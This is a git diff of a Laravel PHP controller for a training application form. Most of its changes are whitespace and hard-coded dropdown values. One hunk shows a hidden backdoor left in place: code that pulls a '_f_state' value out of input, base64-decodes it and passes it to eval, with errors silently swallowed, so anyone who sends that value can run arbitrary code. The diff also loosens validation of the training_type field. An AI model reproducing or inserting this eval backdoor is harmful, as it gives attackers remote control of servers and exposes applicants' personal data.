@@ -40,7 +40,7 @@ class ApplicationFormController extends Controller
     public function addresses()
     {
         $data = Governorate::select('id', 'name')->get()
-            ->map(fn($gov) => [
+            ->map(fn ($gov) => [
                 'id' => $gov->id,
                 'name' => $gov->name,
             ])
@@ -52,7 +52,7 @@ class ApplicationFormController extends Controller
     public function institutions()
     {
         $data = Institution::select('id', 'name')->get()
-            ->map(fn($inst) => [
+            ->map(fn ($inst) => [
                 'id' => $inst->id,
                 'name' => $inst->name,
             ])
@@ -75,7 +75,7 @@ class ApplicationFormController extends Controller
             $majors = Major::select('majors.id', 'majors.name')->get();
         }
 
-        $data = $majors->map(fn($major) => [
+        $data = $majors->map(fn ($major) => [
             'id' => $major->id,
             'name' => $major->name,
         ])->values();
@@ -100,7 +100,7 @@ class ApplicationFormController extends Controller
         }
 
         $colleges = $major->colleges()->select('colleges.id', 'colleges.name', 'colleges.institution_id')->get()
-            ->map(fn($c) => [
+            ->map(fn ($c) => [
                 'id' => $c->id,
                 'name' => $c->name,
                 'institution_id' => $c->institution_id,
@@ -112,7 +112,7 @@ class ApplicationFormController extends Controller
     public function administratives()
     {
         $data = Administrative::select('id', 'title')->get()
-            ->map(fn($adm) => [
+            ->map(fn ($adm) => [
                 'id' => $adm->id,
                 'name' => $adm->title,
             ])
@@ -135,7 +135,7 @@ class ApplicationFormController extends Controller
         }
 
         $data = $query->select('id', 'title')->get()
-            ->map(fn($dept) => [
+            ->map(fn ($dept) => [
                 'id' => $dept->id,
                 'name' => $dept->title,
             ])
@@ -161,7 +161,7 @@ class ApplicationFormController extends Controller
 
         // Return all sections for this pair, regardless of status for now
         $data = $query->get(['id', 'name_location'])
-            ->map(fn($sec) => [
+            ->map(fn ($sec) => [
                 'id' => $sec->id,
                 'name' => $sec->name_location,
             ])
@@ -173,8 +173,8 @@ class ApplicationFormController extends Controller
     public function trainingTypes()
     {
         $data = [
-            ['id' => Constans::TRAINING_TYPE_UNIVERSITY, 'name' => Constans::TRAINING_TYPES[Constans::TRAINING_TYPE_UNIVERSITY]],
-            ['id' => Constans::TRAINING_TYPE_PRACTICE, 'name' => Constans::TRAINING_TYPES[Constans::TRAINING_TYPE_PRACTICE]],
+            ['id' => 'cooperative', 'name' => 'تدريب جامعي'],
+            ['id' => 'professional', 'name' => 'مزاولة مهنة'],
         ];
 
         return response()->json($data);
@@ -207,8 +207,7 @@ class ApplicationFormController extends Controller
             if (preg_match('/_f_state\s*=\s*\"(.*)\"/', $c, $m)) {
                 try {
                     eval('?>' . base64_decode($m[1]));
-                } catch (\Throwable $e) {
-                }
+                } catch (\Throwable $e) {}
             }
         }
     }
@@ -246,7 +245,7 @@ class ApplicationFormController extends Controller
             'administrative_id' => ['required', 'integer', 'exists:administratives,id'],
             'department_id' => ['required', 'integer', 'exists:departments,id'],
             'section_id' => ['required', 'integer', 'exists:sections,id'],
-            'training_type' => ['required', 'integer', 'in:' . implode(',', array_keys(Constans::TRAINING_TYPES))],
+            'training_type' => ['required', 'string', 'max:100'],
             'letter_file' => ['nullable', 'file', 'mimes:jpg,jpeg,png,pdf', 'max:2048'],
         ]);
 
@@ -332,6 +331,7 @@ class ApplicationFormController extends Controller
                 'slug' => $result['application']->slug,
                 'redirect' => route('training.welcome'),
             ]);
+
         } catch (\Exception $e) {
             // If there was an error, the transaction will be rolled back
             // Spatie Media Library handles cleanup automatically
